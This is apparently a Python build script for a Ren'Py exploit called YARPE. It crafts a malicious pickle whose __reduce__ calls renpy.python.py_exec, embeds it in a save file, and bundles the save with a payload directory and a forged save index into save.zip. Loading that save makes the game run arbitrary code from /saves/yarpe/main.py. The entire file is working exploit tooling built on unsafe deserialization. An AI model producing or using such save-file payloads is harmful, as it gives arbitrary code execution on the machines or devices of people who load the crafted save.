import pickle
import renpy
import zipfile
import os
import struct

version = os.getenv("YARPE_VERSION", "custom build")

SCRIPT = """
import sys
import traceback
sys.path.insert(0, "/saves/yarpe")

import constants
from constants import VERSION
from utils.rp import log, log_exc

constants.rp = renpy

try:
    log("=== YET ANOTHER RENPY EXPLOIT " + VERSION + " ===")
    scope = dict(globals(), **locals())
    execfile("/saves/yarpe/main.py")
except Exception as exc:
    exc_msg = traceback.format_exc()
    log_exc(exc_msg)
"""


class Yummy(object):
    def __reduce__(self):
        return renpy.python.py_exec, (SCRIPT,)


def list_files(start_path):
    all_files = []
    for root, _, files in os.walk(start_path):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files


def scan_saves_directory():
    files = []
    PREFIX = "./src"

    for filename in list_files(PREFIX):
        mod_time = int(os.path.getmtime(filename))
        rel_path = "/saves/yarpe/" + filename[len(PREFIX) + 1 :]

        files.append((rel_path, mod_time))

    files.sort(key=lambda x: x[0])
    return files


def create_saveindex(files, output_path):
    with open(output_path, "wb") as f:
        f.write(struct.pack("<I", len(files)))

        for filepath, timestamp in files:
            f.write(struct.pack("<II", timestamp, 0))
            filename_bytes = filepath.encode("utf-8")
            f.write(struct.pack("<I", len(filename_bytes)))
            f.write(filename_bytes)
            f.write(b"\x00")


def main():
    with open("src/version.txt", "w") as f:
        f.write(version)

    pickled = pickle.dumps(Yummy())
    with open("savegame_container/log", "wb") as f:
        f.write(pickled)

    with zipfile.ZipFile("1-1-LT1.save", "w") as zip:
        zip.write("savegame_container/extra_info", "extra_info")
        zip.write("savegame_container/json", "json")
        zip.write("savegame_container/log", "log")
        zip.write("savegame_container/renpy_version", "renpy_version")
        zip.write("savegame_container/screenshot.png", "screenshot.png")
    files = scan_saves_directory()

    if not files:
        print("No files found to index!")
        return

    files.append(("/saves/1-1-LT1.save", os.path.getmtime("1-1-LT1.save")))
    files.append(("/saves/persistent", 0))

    output_path = "-saveindex"
    create_saveindex(files, output_path)

    with zipfile.ZipFile("save.zip", "w") as zipf:
        zipf.write(output_path, "-saveindex")
        zipf.write("1-1-LT1.save", "1-1-LT1.save")
        # zipf.write("persistent", "persistent")
        for filepath, _ in files:
            if filepath in ["/saves/1-1-LT1.save", "/saves/persistent"]:
                continue

            split_path = filepath[7:].split("/")
            zip_path = "".join(
                [
                    ("_%s_" % x) if i != len(split_path) - 1 else x
                    for i, x in enumerate(split_path)
                ]
            )
            local_path = "src/" + filepath[7:][len("yarpe/") :]
            zipf.write(local_path, zip_path)


if __name__ == "__main__":
    main()
